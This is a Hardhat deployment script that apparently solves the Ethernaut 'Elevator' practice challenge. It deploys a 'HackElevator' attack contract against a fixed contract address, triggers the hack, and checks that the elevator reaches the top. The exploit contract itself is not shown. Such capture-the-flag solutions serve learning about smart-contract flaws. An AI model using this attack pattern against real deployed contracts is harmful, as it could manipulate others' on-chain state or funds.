// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Elevator";
  const contractAddress = "0x7AdACD2A42E23ebA1B6aD23bbB291C40658CEB81";

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  let [hacker, _, tester] = await hre.ethers.getSigners();
  hacker = tester;
  console.log(`🤓 Hacker address:\n ${hacker.address} \n`);

  // 📕 Deploy the contract that will execute the hack
  const hackContractName = "Hack" + contractName;
  const HackContract = await ethers.getContractFactory(
    hackContractName,
    hacker
  );
  const hackContract = await HackContract.connect(hacker).deploy(
    contract.address
  );
  await hackContract.deployed();
  console.log(`📕 ${hackContractName} address:\n ${hackContract.address} \n`);

  // 👿 Hacking the contract
  console.log("👿 Hacking the contract...");
  tx = await hackContract.connect(hacker).hackElevator();
  tx = await tx.wait((confirms = 1));

  console.log("\n");
  console.log("👿 Hack hash\n");
  console.log(tx);
  console.log("\n");

  // ✅ Check if the hack was successful
  console.log("✅ Checking if the hack was successful...");
  let isOnTop = await contract.top();
  console.log(`👿 Elevator is on top: ${isOnTop}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
